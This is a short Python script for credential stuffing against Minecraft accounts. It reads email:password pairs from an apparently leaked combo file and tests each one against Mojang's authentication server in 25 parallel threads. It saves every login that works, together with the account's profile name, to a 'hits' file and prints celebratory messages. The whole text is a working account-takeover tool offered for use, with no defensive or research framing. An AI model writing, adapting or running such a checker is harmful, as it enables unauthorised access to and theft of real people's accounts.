import requests,json
from concurrent.futures import ThreadPoolExecutor
hits=[]
with open("minecraft_hotmail_combos.txt")as f:c=[l.strip()for l in f][:5000]
def chk(cm):
 try:
  e,p=cm.split(":")
  r=requests.post("https://authserver.mojang.com/authenticate",json={"agent":{"name":"Minecraft","version":1},"username":e,"password":p},timeout=8).json()
  if"selectedProfile"in r:
   n=r["selectedProfile"]["name"]
   hits.append(f"{e}:{p}|{n}")
   print(f"🎯 {n}")
 except:pass
with ThreadPoolExecutor(25)as e:e.map(chk,c)
open("HITS_minecraft.txt","w").write("\n".join(hits)+"\n")
print(f"✅ {len(hits)} HITS SAVED!")
